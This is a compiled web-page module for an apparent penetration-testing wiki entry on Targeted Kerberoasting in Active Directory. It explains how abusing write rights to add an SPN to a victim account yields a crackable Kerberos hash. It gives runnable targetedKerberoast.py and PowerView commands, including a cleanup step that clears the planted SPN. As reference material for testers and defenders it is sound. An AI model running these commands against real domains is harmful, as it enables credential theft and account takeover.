import{_ as h,c as k,a5 as o,G as a,w as t,j as e,a as i,B as r,o as d}from"./chunks/framework.B5CpDqM0.js";const C=JSON.parse('{"title":"Targeted Kerberoasting","description":"","frontmatter":{"authors":"ShutdownRepo, sckdev"},"headers":[],"relativePath":"ad/movement/dacl/targeted-kerberoasting.md","filePath":"ad/movement/dacl/targeted-kerberoasting.md","lastUpdated":1724982529000}'),p={name:"ad/movement/dacl/targeted-kerberoasting.md"};function c(g,s,F,b,u,y){const n=r("PluginTabsTab"),l=r("PluginTabs");return d(),k("div",null,[s[2]||(s[2]=o('<h1 id="targeted-kerberoasting" tabindex="-1">Targeted Kerberoasting <a class="header-anchor" href="#targeted-kerberoasting" aria-label="Permalink to &quot;Targeted Kerberoasting&quot;">â€‹</a></h1><p>This abuse can be carried out when controlling an object that has a <code>GenericAll</code>, <code>GenericWrite</code>, <code>WriteProperty</code> or <code>Validated-SPN</code> over the target. A member of the <a href="./../builtins/security-groups">Account Operator</a> group usually has those permissions.</p><p>The attacker can add an SPN (<code>ServicePrincipalName</code>) to that account. Once the account has an SPN, it becomes vulnerable to <a href="./../kerberos/kerberoast">Kerberoasting</a>. This technique is called Targeted Kerberoasting.</p>',3)),a(l,null,{default:t(()=>[a(n,{label:"UNIX-like"},{default:t(()=>s[0]||(s[0]=[e("p",null,[i("From UNIX-like systems, this can be done with "),e("a",{href:"https://github.com/ShutdownRepo/targetedKerberoast",target:"_blank",rel:"noreferrer"},"targetedKerberoast.py"),i(" (Python)")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"targetedKerberoast.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -v"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -d"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DC_HOST"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"')])])])],-1)])),_:1}),a(n,{label:"Windows"},{default:t(()=>s[1]||(s[1]=[e("p",null,[i("From Windows machines, this can be achieved with "),e("a",{href:"https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/",target:"_blank",rel:"noreferrer"},"Set-DomainObject"),i(" and "),e("a",{href:"https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainSPNTicket/",target:"_blank",rel:"noreferrer"},"Get-DomainSPNTicket"),i(" ("),e("a",{href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",target:"_blank",rel:"noreferrer"},"PowerView"),i(" module).")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Make sur that the target account has no SPN")]),i(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"Get-DomainUser"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'victimuser'"),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," |"),e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}}," Select"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," serviceprincipalname")]),i(`
`),e("span",{class:"line"}),i(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Set the SPN")]),i(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"Set-DomainObject"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Identity"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'victimuser'"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Set"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," @{serviceprincipalname='nonexistent/BLAHBLAH'}")]),i(`
`),e("span",{class:"line"}),i(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Obtain a kerberoast hash")]),i(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$User = Get-DomainUser "),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'victimuser'")]),i(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$User "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"|"),e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}}," Get-DomainSPNTicket"),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," |"),e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}}," fl")]),i(`
`),e("span",{class:"line"}),i(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Clear the SPNs of the target account")]),i(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$User "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"|"),e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}}," Select"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," serviceprincipalname")]),i(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"Set-DomainObject"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Identity"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," victimuser"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Clear"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," serviceprincipalname")])])])],-1)])),_:1})]),_:1}),s[3]||(s[3]=e("p",null,[i("Once the Kerberoast hash is obtained, it can possibly be "),e("a",{href:"./../credentials/cracking"},"cracked"),i(" to recover the account's password if the password used is weak enough.")],-1))])}const E=h(p,[["render",c]]);export{C as __pageData,E as default};
